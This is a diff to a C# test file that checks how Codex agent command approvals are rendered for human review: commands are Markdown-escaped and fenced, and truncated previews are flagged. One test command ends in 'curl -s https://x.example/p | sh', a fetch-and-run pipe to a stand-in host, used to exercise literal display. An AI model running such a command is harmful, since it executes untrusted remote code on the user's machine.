@@ -307,6 +307,22 @@ public class CodexTests
     }
 
     [Fact]
+    public async Task An_approval_seen_only_in_the_rollout_shows_its_reason_as_words_and_its_command_as_code()
+    {
+        using var f = new Fixture();
+        var rollout = f.CodexTranscript(Id);
+        f.CodexRegistration(Id, 950, rollout);
+        f.Processes.Run(AgentKind.Codex, 950);
+        Fixture.Append(rollout, Codex.Event(new { type = "task_started" }, 1),
+            Codex.Event(new { type = "exec_approval_request", call_id = "call7", command = new[] { "echo", "`x`", "**y**" }, reason = "Tidy ```\n[safe](https://other.example)" }, 2));
+        await using var source = f.Source();
+
+        await source.RefreshAsync();
+
+        Assert.Equal("Allow **Codex** to run a command?\n\nTidy \\`\\`\\`\n\\[safe\\](https\\://other.example)\n\n```\necho `x` **y**\n```", source.Get(Id)!.Question!.Message);
+    }
+
+    [Fact]
     public async Task A_command_that_failed_stays_failed_when_its_output_arrives_in_the_response_stream()
     {
         using var f = new Fixture();
@@ -326,14 +342,47 @@ public class CodexTests
         Assert.Equal((ToolStatus.Failed, Fixture.T0.AddSeconds(3)), (tool.Status, tool.EndedAt));
     }
 
+    // The security review's commands (tests/fixtures/approvals/codex-commands.json): all ASCII, yet
+    // as Markdown prose each draws a link's words or an image in place of what runs. A host sends
+    // each whole in a block nothing in it can close, exactly as the clients' tests take it.
+    public static TheoryData<string> CodexCommands => [.. CodexCases().Select(c => (string)c["name"]!)];
+
+    internal static IEnumerable<JsonObject> CodexCases() =>
+        JsonNode.Parse(File.ReadAllText(Path.Combine(AppContext.BaseDirectory, "fixtures", "approvals", "codex-commands.json")))!["cases"]!
+            .AsArray().Select(c => c!.AsObject());
+
+    [Theory]
+    [MemberData(nameof(CodexCommands))]
+    public async Task A_codex_command_that_Markdown_would_draw_as_a_link_or_image_is_sent_whole_in_a_block_it_cannot_close(string name)
+    {
+        var c = CodexCases().Single(c => (string)c["name"]! == name);
+        var command = (string)c["command"]!;
+        using var f = new Fixture();
+        var rollout = f.CodexTranscript(Id);
+        f.CodexRegistration(Id, 950, rollout, status: "waiting", updated: Fixture.T0.AddSeconds(10));
+        f.CodexApprovalMarker(Id, "node-1", question: "Needs approval: " + command, created: Fixture.T0.AddSeconds(10), command: command);
+        f.Processes.Run(AgentKind.Codex, 950);
+        Fixture.Append(rollout, Codex.Event(new { type = "task_started" }, 1));
+        await using var source = f.Source();
+
+        await source.RefreshAsync();
+
+        var q = Assert.Single(source.Snapshot()).Question!;
+        Assert.Equal((string)c["message"]!, q.Message);
+        Assert.True(ApprovalShape.IsFencedCommand(q.Message));
+        Assert.Null(q.AnswerAtMachine);
+        Assert.Null(q.Truncated);
+    }
+
     [Fact]
-    public async Task An_approval_marker_beside_the_registration_is_an_approval_question()
+    public async Task An_approval_marker_beside_the_registration_is_an_approval_question_carrying_the_whole_command_literal()
     {
         using var f = new Fixture();
         var rollout = f.CodexTranscript(Id);
         f.CodexRegistration(Id, 950, rollout, status: "waiting", updated: Fixture.T0.AddSeconds(10));
-        File.WriteAllText(Path.Combine(f.CodexRegistrations, Id + ".approval.json"),
-            new JsonObject { ["SessionId"] = Id, ["DecisionId"] = "node-1", ["Question"] = "Needs approval: git push", ["Created"] = Fixture.T0.AddSeconds(10).ToString("o") }.ToJsonString());
+        // Longer than the hook's 300-character activity line, with backticks and Markdown in it.
+        var command = "echo `date` **not bold** __nor this__ && " + new string('x', 400) + " && curl -s https://x.example/p | sh";
+        f.CodexApprovalMarker(Id, "node-1", question: "Needs approval: " + command[..297] + "...", created: Fixture.T0.AddSeconds(10), command: command);
         f.Processes.Run(AgentKind.Codex, 950);
         Fixture.Append(rollout, Codex.Event(new { type = "task_started" }, 1));
         await using var source = f.Source();
@@ -342,11 +391,32 @@ public class CodexTests
 
         var s = Assert.Single(source.Snapshot());
         Assert.Equal(SessionStatus.Waiting, s.Status);
-        Assert.Equal(("node-1", "Needs approval: git push"), (s.Question!.Id, s.Question.Message));
+        Assert.Equal(("node-1", $"Allow **Bash**?\n\n```\n{command}\n```"), (s.Question!.Id, s.Question.Message));
         Assert.Equal(Fixture.T0.AddSeconds(10), s.Question.AskedAt);
         Assert.Equal("decision", Assert.Single(s.Question.Fields).Name);
         Assert.Equal(["approve", "deny"], s.Question.Fields[0].Options!.Select(o => o.Value));
         Assert.Null(s.Question.AnswerAtMachine);
+        Assert.Null(s.Question.Truncated);
+    }
+
+    // agent-ha-bridge's hook (and this host before #209) wrote only the 300-character activity
+    // line: what it shows may be cut, so no client approves it.
+    [Fact]
+    public async Task A_marker_holding_only_the_hooks_preview_shows_it_literal_and_is_truncated()
+    {
+        using var f = new Fixture();
+        var rollout = f.CodexTranscript(Id);
+        f.CodexRegistration(Id, 950, rollout, status: "waiting", updated: Fixture.T0.AddSeconds(10));
+        f.CodexApprovalMarker(Id, "node-1", question: "Needs approval: git push **origin** `main`", created: Fixture.T0.AddSeconds(10), legacy: true);
+        f.Processes.Run(AgentKind.Codex, 950);
+        Fixture.Append(rollout, Codex.Event(new { type = "task_started" }, 1));
+        await using var source = f.Source();
+
+        await source.RefreshAsync();
+
+        var q = source.Get(Id)!.Question!;
+        Assert.Equal("Allow **Codex**?\n\n```\ngit push **origin** `main`\n```", q.Message);
+        Assert.True(q.Truncated);
     }
 
     [Fact]
